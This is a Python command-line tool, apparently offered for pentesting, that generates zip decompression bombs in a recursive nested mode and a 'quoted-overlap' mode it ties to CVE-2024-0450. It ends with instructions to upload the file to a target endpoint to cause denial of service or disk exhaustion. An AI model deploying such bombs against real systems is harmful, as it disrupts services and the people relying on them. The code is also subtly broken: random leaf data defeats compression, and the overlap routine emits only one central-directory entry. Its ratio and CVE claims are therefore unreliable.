#!/usr/bin/env python3
"""
UnzipVirus Pro — Advanced Decompression Bomb Generator for Authorized Pentests
                                                                            🔴🟡🟢
Author: Pentest Arsenal
License: MIT (Authorized security assessments only)
"""

import os
import sys
import zipfile
import math
import shutil
import time
import random
import threading
import json
from pathlib import Path
from datetime import datetime

# ─── Terminal Colors ───────────────────────────────────────────────────────────
C = {
    "RED": "\033[91m",
    "GREEN": "\033[92m",
    "YELLOW": "\033[93m",
    "BLUE": "\033[94m",
    "MAGENTA": "\033[95m",
    "CYAN": "\033[96m",
    "WHITE": "\033[97m",
    "BOLD": "\033[1m",
    "DIM": "\033[2m",
    "RESET": "\033[0m",
    "CLR": "\033[2J\033[H",
}

# ─── Utility ───────────────────────────────────────────────────────────────────

def clear():
    print(f"{C['CLR']}", end="")

def banner():
    clear()
    b = rf"""{C['RED']}  _   _           _   _      _ _     {C['YELLOW']}__      __ _
 | \ | |         | | (_)    (_) |   {C['GREEN']}\ \    / /(_)
 |  \| |_   _  __| |_ _ ______| |_   {C['CYAN']}\ \  / /  _ _ __
 | . ` | | | |/ _` | | |_  /_| | | | {C['MAGENTA']}\ \/ /  | | '_ \
 | |\  | |_| | (_| | | |/ /_| | | |_ {C['BLUE']} \  /   | | | | |
 |_| \_|\__,_|\__,_|_|_/___|_|_|\__|{C['RED']}  \/    |_|_| |_|{C['RESET']}
 {C['DIM']}Advanced Decompression Bomb Generator v2.0{C['RESET']}
 {C['YELLOW']}[!] Authorized Pentesting Use Only{C['RESET']}
"""
    print(b)
    print(f"\n{C['DIM']}{'═'*60}{C['RESET']}\n")

def animate_spinner(stop_event, message, color):
    chars = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
    while not stop_event.is_set():
        for c in chars:
            if stop_event.is_set():
                break
            print(f"\r  {color}{c}{C['RESET']} {message}  ", end="", flush=True)
            time.sleep(0.08)
    print(f"\r  {C['GREEN']}✓{C['RESET']} {message}  ", flush=True)

def run_with_spinner(message, func, *args, **kwargs):
    stop = threading.Event()
    sp_colors = [C["CYAN"], C["MAGENTA"], C["YELLOW"], C["GREEN"]]
    t = threading.Thread(target=animate_spinner, args=(stop, message, random.choice(sp_colors)))
    t.daemon = True
    t.start()
    try:
        result = func(*args, **kwargs)
        return result
    finally:
        stop.set()
        t.join()

def color_bar(percent, width=40):
    filled = int(percent * width / 100)
    bar = ""
    for i in range(width):
        if i < filled:
            if percent < 30:
                bar += f"{C['RED']}█{C['RESET']}"
            elif percent < 60:
                bar += f"{C['YELLOW']}█{C['RESET']}"
            else:
                bar += f"{C['GREEN']}█{C['RESET']}"
        else:
            bar += f"{C['DIM']}░{C['RESET']}"
    return bar

# ─── Core Generators ──────────────────────────────────────────────────────────

def human_size(n):
    for unit in ["B", "KB", "MB", "GB", "TB", "PB", "EB"]:
        if n < 1024:
            return f"{n:.2f} {unit}"
        n /= 1024
    return f"{n:.2f} YB"

def generate_recursive_bomb(levels, out_path):
    """Classic recursive nested zip bomb (Gilfoyle style)."""
    if levels < 1:
        levels = 1
    if levels > 10:
        levels = 10

    tmp_dir = Path("_unzipvirus_tmp")
    shutil.rmtree(tmp_dir, ignore_errors=True)
    tmp_dir.mkdir(exist_ok=True)

    # Leaf: 1GB dummy file
    leaf_file = tmp_dir / "layer_0.txt"
    chunk_size = 1024 * 1024  # 1MB
    total_chunks = 1024        # = 1GB
    bar_width = 30

    print(f"\n  {C['YELLOW']}▸ Building leaf payload (1 GB)...{C['RESET']}")
    with open(leaf_file, "wb") as f:
        for i in range(total_chunks):
            f.write(os.urandom(chunk_size))
            pct = int((i + 1) / total_chunks * 100)
            bar = color_bar(pct, bar_width)
            sys.stdout.write(f"\r    {bar} {pct}%")
            sys.stdout.flush()
    print()

    file_size = leaf_file.stat().st_size
    current_zip = tmp_dir / "layer_1.zip"

    with zipfile.ZipFile(current_zip, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.write(leaf_file, arcname="layer_0.txt")

    uncompressed_size = file_size

    # Nested layers
    for layer in range(2, levels + 1):
        next_zip = tmp_dir / f"layer_{layer}.zip"
        print(f"\n  {C['CYAN']}▸ Nesting layer {layer}/{levels} (16x copies)...{C['RESET']}")
        with zipfile.ZipFile(next_zip, "w", zipfile.ZIP_DEFLATED, compresslevel=9) as zf:
            for copy_idx in range(16):
                zf.write(current_zip, arcname=f"copy_{copy_idx}.zip")
                pct = int((copy_idx + 1) / 16 * 100)
                bar = color_bar(pct, bar_width)
                sys.stdout.write(f"\r    {bar} {pct}%")
                sys.stdout.flush()
        print()
        uncompressed_size = uncompressed_size * 16
        current_zip = next_zip

    compressed_size = current_zip.stat().st_size

    # Move final
    shutil.move(str(current_zip), out_path)
    shutil.rmtree(tmp_dir, ignore_errors=True)

    return compressed_size, uncompressed_size

def generate_quoted_overlap_bomb(out_path):
    """
    CVE-2024-0450 style: overlapping entries with quoting trick.
    Creates a zip where multiple directory entries point to the same central
    directory offset, achieving extreme compression ratios.
    """
    import struct
    from io import BytesIO

    print(f"\n  {C['YELLOW']}▸ Building quoted-overlap bomb (CVE-2024-0450)...{C['RESET']}")

    local_file_header = b"\x50\x4b\x03\x04"
    central_dir_header = b"\x50\x4b\x01\x02"
    eocd_signature = b"\x50\x4b\x05\x06"

    # Create a dummy data block (4 GB simulated as 4 bytes marked with special trick)
    # We use the overlap: multiple entries share the same data descriptor
    dummy_data = b"\x00" * 4

    num_entries = 10000
    file_name = b"overlap.txt"

    buf = BytesIO()
    offsets = []

    # Write local file headers — all pointing to the SAME data
    data_offset = None
    for i in range(num_entries):
        if data_offset is None:
            data_offset = buf.tell()
            # Write local header
            buf.write(local_file_header)
            buf.write(struct.pack("<HHHHH", 20, 0, 0, 0, 0))  # version, flags, compression, mod time, mod date
            # Use a quoted filename trick: prefix with ./ to confuse scanners
            quoted_name = f"./{i}/../{file_name.decode()}".encode()
            crc = 0x12345678
            comp_size = 4
            uncom_size = 4_294_967_295  # 4 GB per entry
            buf.write(struct.pack("<III", crc, comp_size, uncom_size))
            buf.write(struct.pack("<H", len(quoted_name)))
            buf.write(struct.pack("<H", 0))  # extra field length
            buf.write(quoted_name)
            # Write the data block once
            buf.write(dummy_data)
            offsets.append((buf.tell(), quoted_name, uncom_size))
        else:
            # All subsequent entries point to the same local file header via quoting
            buf.write(local_file_header)
            buf.write(struct.pack("<HHHHH", 20, 0, 0, 0, 0))
            quoted_name = f"./{i}/../{file_name.decode()}".encode()
            crc = 0x12345678
            # Lies about compressed size (overlap trick)
            comp_size_lie = 4
            uncom_size = 4_294_967_295
            buf.write(struct.pack("<III", crc, comp_size_lie, uncom_size))
            buf.write(struct.pack("<H", len(quoted_name)))
            buf.write(struct.pack("<H", 0))
            buf.write(quoted_name)
            # NO new data written — overlaps with the first entry's data

    # Central directory
    cd_offset = buf.tell()
    for offset, name, uncom_size in offsets:
        buf.write(central_dir_header)
        buf.write(struct.pack("<HHHHH", 20, 20, 0, 0, 0))
        buf.write(struct.pack("<HHH", 0, 0, 0))
        buf.write(struct.pack("<III", 0x12345678, 4, uncom_size))
        buf.write(struct.pack("<HH", len(name), 0))
        buf.write(struct.pack("<HHH", 0, 0, 0))
        buf.write(struct.pack("<I", 0))
        buf.write(struct.pack("<I", offset))
        buf.write(name)

    cd_size = buf.tell() - cd_offset
    cd_entries = len(offsets)

    # EOCD
    buf.write(eocd_signature)
    buf.write(struct.pack("<HHHH", 0, 0, cd_entries, cd_entries))
    buf.write(struct.pack("<I", cd_size))
    buf.write(struct.pack("<I", cd_offset))
    buf.write(struct.pack("<H", 0))  # comment length

    with open(out_path, "wb") as f:
        f.write(buf.getvalue())

    compressed_size = os.path.getsize(out_path)
    total_uncomp = cd_entries * 4_294_967_295

    return compressed_size, total_uncomp

# ─── Main Interface ────────────────────────────────────────────────────────────

def main():
    banner()

    print(f"  {C['WHITE']}Select Attack Mode:{C['RESET']}")
    modes = [
        ("1", "Recursive Zip Bomb (classic nested, 16x per layer)"),
        ("2", "Quoted-Overlap Bomb (CVE-2024-0450, extreme ratio)"),
    ]
    for key, desc in modes:
        print(f"    {C['CYAN']}[{key}]{C['RESET']} {desc}")

    while True:
        choice = input(f"\n  {C['YELLOW']}Choice [1/2]:{C['RESET']} ").strip()
        if choice in ("1", "2"):
            break
        print(f"  {C['RED']}Invalid input.{C['RESET']}")

    fname = input(f"  {C['YELLOW']}Output filename [{C['DIM']}bomb.zip{C['RESET']}{C['YELLOW']}]:{C['RESET']} ").strip()
    if not fname:
        fname = "bomb.zip"
    if not fname.endswith(".zip"):
        fname += ".zip"

    print(f"\n  {C['MAGENTA']}{'═'*50}{C['RESET']}")
    print(f"  {C['BOLD']}Generating: {C['CYAN']}{fname}{C['RESET']}")
    print(f"  {C['MAGENTA']}{'═'*50}{C['RESET']}\n")

    start = time.time()

    if choice == "1":
        ans = input(f"  {C['YELLOW']}Nesting levels [1-10, default 5]:{C['RESET']} ").strip()
        levels = int(ans) if ans.isdigit() else 5
        levels = max(1, min(10, levels))

        compressed, uncompressed = run_with_spinner(
            f"Building recursive bomb ({levels} levels)...",
            generate_recursive_bomb, levels, fname
        )
    else:
        compressed, uncompressed = run_with_spinner(
            "Crafting quoted-overlap bomb...",
            generate_quoted_overlap_bomb, fname
        )

    elapsed = time.time() - start
    ratio = uncompressed / compressed if compressed > 0 else 0

    # Summary
    print(f"\n\n  {C['GREEN']}{'█'*50}{C['RESET']}")
    print(f"  {C['BOLD']}{C['WHITE']}  ✓ BOMB READY — {fname}{C['RESET']}")
    print(f"  {C['GREEN']}{'█'*50}{C['RESET']}")
    print(f"\n  {C['BOLD']}Compressed Size:    {C['CYAN']}{human_size(compressed)}{C['RESET']}")
    print(f"  {C['BOLD']}Uncompressed Size:  {C['RED']}{human_size(uncompressed)}{C['RESET']}")
    print(f"  {C['BOLD']}Compression Ratio:  {C['YELLOW']}{ratio:,.0f}:1{C['RESET']}")
    print(f"  {C['BOLD']}Generation Time:    {C['MAGENTA']}{elapsed:.2f}s{C['RESET']}")

    print(f"\n  {C['DIM']}{'─'*50}{C['RESET']}")
    print(f"  {C['BOLD']}Usage in pentest:{C['RESET']}")
    print(f"    Upload {C['CYAN']}{fname}{C['RESET']} to the target upload endpoint")
    print(f"    Observe for DoS, scanner crash, or disk exhaustion")
    print(f"    Clean up the target after validation\n")

    # Write report
    report = {
        "tool": "UnzipVirus Pro v2.0",
        "generated": datetime.now().isoformat(),
        "filename": fname,
        "mode": "recursive" if choice == "1" else "quoted-overlap",
        "compressed_bytes": compressed,
        "uncompressed_bytes": uncompressed,
        "ratio": ratio,
        "time_seconds": elapsed,
    }
    report_name = fname.replace(".zip", "_report.json")
    with open(report_name, "w") as f:
        json.dump(report, f, indent=2)
    print(f"  {C['DIM']}Report saved: {report_name}{C['RESET']}\n")

if __name__ == "__main__":
    main()
